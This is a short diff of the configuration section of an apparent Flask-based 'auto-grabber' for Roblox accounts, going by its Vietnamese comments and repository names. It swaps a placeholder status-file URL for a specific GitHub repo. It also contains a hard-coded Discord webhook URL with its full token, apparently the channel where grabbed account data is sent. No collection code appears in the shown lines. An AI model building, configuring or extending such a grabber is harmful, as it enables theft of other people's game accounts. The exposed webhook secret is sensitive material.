@@ -8,7 +8,7 @@ app = Flask(__name__)
 
 # ===== CẤU HÌNH =====
 # URL RAW của file status.txt trên GitHub (THAY BẰNG LINK CỦA BẠN)
-STATUS_URL = "https://raw.githubusercontent.com/your-username/auto-grabber-roblox/main/status.txt"
+STATUS_URL = "https://github.com/caodinhkhoi282-bot/L-y-th-ng-tin-acc-roblox/blob/main/status.txt"
 
 # Discord Webhook
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532377022137892928/DAwlZwsG3ngH2tEL2Oc7XgrXkz0xu8y4kfgzKssdb7UuTS8jVPoWB1MdxFRTT5HIv_RK"
